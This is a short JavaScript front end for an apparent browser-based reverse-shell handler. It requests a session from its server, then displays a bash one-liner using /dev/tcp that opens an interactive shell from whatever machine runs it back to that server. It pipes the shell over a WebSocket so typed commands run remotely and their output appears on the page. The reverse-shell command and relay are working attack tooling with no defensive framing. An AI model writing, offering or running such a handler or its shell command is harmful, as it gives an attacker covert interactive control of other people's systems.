const state = {
  id: void 0,
  connection: void 0,
}

const appendMessage = (message) => {
  document.getElementById('output').textContent += message
}

const setCommand = (meta) => {
  const command = (
    `bash -c 'exec<>/dev/tcp/${location.hostname}/${meta.port};` +
    `echo>&0 ${meta.id};$0 -i<&0 >&0 2>&0'`
  )
  document.getElementById('command').textContent = command
}

document.getElementById('start').addEventListener('click', async () => {
  const res = await fetch('/start', { method: 'POST' })
  const meta = await res.json()
  setCommand(meta)
  const wsUrl = new URL(location)
  wsUrl.protocol = wsUrl.protocol.replace('http', 'ws')
  wsUrl.pathname = `/connect/${meta.id}`
  state.connection = new WebSocket(wsUrl)
  state.connection.addEventListener('message', async (evt) => {
    appendMessage(await evt.data.text())
  })
})

document.getElementById('form').addEventListener('submit', (evt) => {
  evt.preventDefault()
  if (!state.connection) return
  const input = document.getElementById('input')
  const data = input.value + '\n'
  input.value = ''
  state.connection.send(data)
  appendMessage(data)
})
